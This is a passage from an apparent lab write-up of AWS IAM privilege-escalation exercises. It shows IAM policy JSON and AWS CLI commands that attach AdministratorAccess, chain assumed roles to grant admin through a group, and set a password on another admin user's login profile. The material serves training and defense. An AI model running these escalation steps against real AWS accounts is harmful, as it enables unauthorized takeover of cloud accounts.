</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
    </span><span class="nl">"Role"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"Path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"RoleName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ad-LoggingRole"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"RoleId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"AROAUAWOPGE5JQT23CRUN"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"Arn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::276384657722:role/ad-LoggingRole"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"CreateDate"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2021-01-20T06:15:40+00:00"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"AssumeRolePolicyDocument"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
                </span><span class="p">{</span><span class="w">
                    </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
                    </span><span class="nl">"Principal"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                        </span><span class="nl">"AWS"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="w">
                    </span><span class="p">},</span><span class="w">
                    </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sts:AssumeRole"</span><span class="w">
                </span><span class="p">}</span><span class="w">
            </span><span class="p">]</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="nl">"MaxSessionDuration"</span><span class="p">:</span><span class="w"> </span><span class="mi">3600</span><span class="p">,</span><span class="w">
        </span><span class="nl">"RoleLastUsed"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"LastUsedDate"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2022-04-24T17:35:13+00:00"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"Region"</span><span class="p">:</span><span class="w"> </span><span class="s2">"us-east-1"</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>The policy allows any AWS account to assume this role i.e., wildcard. This is bad.</p><hr /><h2 id="overly-permissive-permission-1"><span class="me-2">Overly Permissive Permission 1</span><a href="#overly-permissive-permission-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This lab provides a user in an AWS account and the objective is to obtain administrative privileges using an overly permissive permission.</p><p>Listing the details of the user from UserDetailList, the <code class="language-plaintext highlighter-rouge">student</code> user has the following policies →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"Path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"UserName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"student"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"UserId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"AIDAS4LAHUW7BDJ6WXEI3"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"Arn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::198307194302:user/student"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"CreateDate"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2022-04-25T01:50:49+00:00"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"GroupList"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
  </span><span class="nl">"AttachedManagedPolicies"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"PolicyName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"IAMReadOnlyAccess"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"PolicyArn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::aws:policy/IAMReadOnlyAccess"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"PolicyName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Service"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"PolicyArn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::198307194302:policy/Service"</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">],</span><span class="w">
  </span><span class="nl">"Tags"</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>The policy <code class="language-plaintext highlighter-rouge">Service</code> can be retrieved as follows →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>awsn iam get-policy-version <span class="nt">--version-id</span> v1 <span class="nt">--policy-arn</span> arn:aws:iam::198307194302:policy/Service
</pre></table></code></div></div><p>This gives the following policy →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
    </span><span class="nl">"PolicyVersion"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"Document"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
                </span><span class="p">{</span><span class="w">
                    </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"iam:AttachUserPolicy"</span><span class="p">,</span><span class="w">
                    </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
                    </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::*:user/*"</span><span class="w">
                </span><span class="p">}</span><span class="w">
            </span><span class="p">],</span><span class="w">
            </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="nl">"VersionId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"v1"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"IsDefaultVersion"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
        </span><span class="nl">"CreateDate"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2022-04-25T01:50:49+00:00"</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>This allows the user to attach arbitrary policies to any user. Thus, the administrator privileges can be granted to any user. In this instance, granting the Administrator policy to the <code class="language-plaintext highlighter-rouge">student</code> user can be done as follows →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">asd</span><span class="o">=</span><span class="si">$(</span>awsn iam list-policies | jq <span class="s1">'.Policies[] | select(.PolicyName == "AdministratorAccess") | .Arn'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="si">)</span>
awsn iam attach-user-policy <span class="nt">--user-name</span> student <span class="nt">--policy-arn</span> <span class="nv">$asd</span>
</pre></table></code></div></div><p>This solves the lab.</p><hr /><h2 id="dangerous-policy-combination-1"><span class="me-2">Dangerous Policy Combination 1</span><a href="#dangerous-policy-combination-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This lab gives an IAM user with the objective to leverage the policies attached to the <code class="language-plaintext highlighter-rouge">student</code> user and attain administrative privileges on the AWS account.</p><p>Using the User detail list to check the policies for the <code class="language-plaintext highlighter-rouge">student</code> user →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"Path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"UserName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"student"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"UserId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"AIDAZNIQILDEKIBVNHP56"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"Arn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::646963550408:user/student"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"CreateDate"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2022-04-25T02:37:36+00:00"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"UserPolicyList"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"PolicyName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"terraform-20220425023745069800000002"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"PolicyDocument"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
          </span><span class="p">{</span><span class="w">
            </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
              </span><span class="s2">"sts:AssumeRole"</span><span class="w">
            </span><span class="p">],</span><span class="w">
            </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
              </span><span class="s2">"arn:aws:iam::646963550408:role/Adder"</span><span class="p">,</span><span class="w">
              </span><span class="s2">"arn:aws:iam::646963550408:role/Attacher"</span><span class="w">
            </span><span class="p">]</span><span class="w">
          </span><span class="p">}</span><span class="w">
        </span><span class="p">]</span><span class="w">
      </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">],</span><span class="w">
  </span><span class="nl">"GroupList"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
  </span><span class="nl">"AttachedManagedPolicies"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"PolicyName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"IAMReadOnlyAccess"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"PolicyArn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::aws:policy/IAMReadOnlyAccess"</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">],</span><span class="w">
  </span><span class="nl">"Tags"</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>Thus, the user can assume the two roles of <code class="language-plaintext highlighter-rouge">Adder</code> and <code class="language-plaintext highlighter-rouge">Attacher</code>. These policies can be retrieved from the respective roles using the Role detail list →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"Path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"RoleName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Adder"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"RoleId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"AROAZNIQILDEGUAHO6ICH"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"Arn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::646963550408:role/Adder"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"CreateDate"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2022-04-25T02:37:44+00:00"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"AssumeRolePolicyDocument"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
      </span><span class="p">{</span><span class="w">
        </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"Principal"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
          </span><span class="nl">"AWS"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::646963550408:user/student"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sts:AssumeRole"</span><span class="w">
      </span><span class="p">}</span><span class="w">
    </span><span class="p">]</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="nl">"InstanceProfileList"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
  </span><span class="nl">"RolePolicyList"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"PolicyName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"AddUser"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"PolicyDocument"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
          </span><span class="p">{</span><span class="w">
            </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"iam:AddUserToGroup"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::646963550408:group/Printers"</span><span class="w">
          </span><span class="p">}</span><span class="w">
        </span><span class="p">]</span><span class="w">
      </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">],</span><span class="w">
  </span><span class="nl">"AttachedManagedPolicies"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
  </span><span class="nl">"Tags"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
  </span><span class="nl">"RoleLastUsed"</span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"Path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"RoleName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Attacher"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"RoleId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"AROAZNIQILDELXDKYIOZ2"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"Arn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::646963550408:role/Attacher"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"CreateDate"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2022-04-25T02:37:44+00:00"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"AssumeRolePolicyDocument"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
      </span><span class="p">{</span><span class="w">
        </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"Principal"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
          </span><span class="nl">"AWS"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::646963550408:user/student"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sts:AssumeRole"</span><span class="w">
      </span><span class="p">}</span><span class="w">
    </span><span class="p">]</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="nl">"InstanceProfileList"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
  </span><span class="nl">"RolePolicyList"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"PolicyName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"AttachPolicy"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"PolicyDocument"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
          </span><span class="p">{</span><span class="w">
            </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"iam:AttachGroupPolicy"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::646963550408:group/Printers"</span><span class="w">
          </span><span class="p">}</span><span class="w">
        </span><span class="p">]</span><span class="w">
      </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">],</span><span class="w">
  </span><span class="nl">"AttachedManagedPolicies"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
  </span><span class="nl">"Tags"</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span><span class="w">
  </span><span class="nl">"RoleLastUsed"</span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>Therefore, the <code class="language-plaintext highlighter-rouge">Adder</code> role allows adding users to the group <code class="language-plaintext highlighter-rouge">Printers</code> and the <code class="language-plaintext highlighter-rouge">Attacher</code> policy allows attaching policies to the group <code class="language-plaintext highlighter-rouge">Printers</code>. Therefore, the escalation path is to add the <code class="language-plaintext highlighter-rouge">AdministratorAccess</code> policy to the <code class="language-plaintext highlighter-rouge">Printers</code> group and then add the <code class="language-plaintext highlighter-rouge">student</code> user to that group. This will grant us administrative privileges. Assume the roles and save the credentials output to <code class="language-plaintext highlighter-rouge">assumed_role</code> after which the commands can be invoked as follows →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>assumed_role|jq <span class="s1">'.Credentials.AccessKeyId'</span>|tr <span class="nt">-d</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="si">)</span> <span class="se">\ </span>                                                                              with root@cf9d78fcffc0
<span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>assumed_role|jq <span class="s1">'.Credentials.SecretAccessKey'</span>|tr <span class="nt">-d</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="si">)</span> <span class="se">\</span>
<span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>assumed_role|jq <span class="s1">'.Credentials.SessionToken'</span>|tr <span class="nt">-d</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="si">)</span> <span class="se">\</span>
awsn iam add-user-to-group <span class="nt">--group-name</span> Printers <span class="nt">--user-name</span> student
</pre></table></code></div></div><p>Similarly, repeat for <code class="language-plaintext highlighter-rouge">Attacher</code> and attach the policy using the following →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c"># same env vars to use the assumed role session</span>
awsn iam attach-group-policy <span class="nt">--policy-arn</span> arn:aws:iam::aws:policy/AdministratorAccess <span class="nt">--group-name</span> Printers
</pre></table></code></div></div><hr /><h2 id="dangerous-policy-combination-2"><span class="me-2">Dangerous Policy Combination 2</span><a href="#dangerous-policy-combination-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This lab provided an IAM user in an AWS account and the objective was to gain administrative privileges.</p><p>Looking at the users in IAM, using the User detail list, there are 2 users and only one with policies which is <code class="language-plaintext highlighter-rouge">student</code>. The <code class="language-plaintext highlighter-rouge">student</code> user has a policy to assume the roles of <code class="language-plaintext highlighter-rouge">Adder</code> and <code class="language-plaintext highlighter-rouge">PolicyUpdater</code>. Looking at these roles using the Role detail list, the <code class="language-plaintext highlighter-rouge">Adder</code> role can add a user to the <code class="language-plaintext highlighter-rouge">Printers</code> group while the <code class="language-plaintext highlighter-rouge">PolicyUpdater</code> role can create a new version for the policy <code class="language-plaintext highlighter-rouge">Print</code>.</p><p>The <code class="language-plaintext highlighter-rouge">Printers</code> group has the <code class="language-plaintext highlighter-rouge">Print</code> policy attached to it. Therefore, path of escalation is to create a new version of the <code class="language-plaintext highlighter-rouge">Print</code> policy which allows administrator access to the <code class="language-plaintext highlighter-rouge">Printers</code> group and then add the <code class="language-plaintext highlighter-rouge">student</code> user to the <code class="language-plaintext highlighter-rouge">Printers</code> group.</p><p>Therefore, assume role of <code class="language-plaintext highlighter-rouge">Adder</code> and add the user to the <code class="language-plaintext highlighter-rouge">Printers</code> group. Next, assume role of <code class="language-plaintext highlighter-rouge">PolicyUpdater</code> and create a new version for the <code class="language-plaintext highlighter-rouge">Print</code> policy using the standard administrative policy file. The <code class="language-plaintext highlighter-rouge">create-policy-version</code> subcommand also has a flag to make the new version default. This can be done as follows →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>awsn iam create-policy-version <span class="nt">--policy-arn</span> arn:aws:iam::871597022766:policy/Print <span class="nt">--policy-document</span> file://policy.json <span class="nt">--set-as-default</span>
</pre></table></code></div></div><p>This gives the <code class="language-plaintext highlighter-rouge">student</code> user administrative privileges. This also solves the lab.</p><hr /><h2 id="overly-permissive-permission-2"><span class="me-2">Overly Permissive Permission 2</span><a href="#overly-permissive-permission-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The lab provides an IAM user <code class="language-plaintext highlighter-rouge">student</code> within an AWS account with the objective of gaining administrative access on the account.</p><p>Looking at the user detail list, there are 4 users → <code class="language-plaintext highlighter-rouge">student</code> which is us, <code class="language-plaintext highlighter-rouge">identity</code> which is useless, <code class="language-plaintext highlighter-rouge">AdminBob</code> and <code class="language-plaintext highlighter-rouge">AdminJane</code> which are the two admins,</p><p>Upon looking at the policies, the <code class="language-plaintext highlighter-rouge">student</code> user has the following policy inline →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
      </span><span class="nl">"PolicyName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"terraform-20220425212035034400000001"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"PolicyDocument"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
          </span><span class="p">{</span><span class="w">
            </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
              </span><span class="s2">"iam:CreateLoginProfile"</span><span class="p">,</span><span class="w">
              </span><span class="s2">"iam:ChangePassword"</span><span class="w">
            </span><span class="p">],</span><span class="w">
            </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="w">
          </span><span class="p">}</span><span class="w">
        </span><span class="p">]</span><span class="w">
      </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>With this, a new login profile can be used on any user on the account. Therefore, a skeleton is created using the following command →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>awsn iam create-login-profile <span class="nt">--generate-cli-skeleton</span> <span class="o">&gt;</span> create-login-profile.json
</pre></table></code></div></div><p>This creates a skeleton json file which can be edited as follows →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
    </span><span class="nl">"UserName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"AdminBob"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Root00--123@"</span><span class="p">,</span><span class="w">
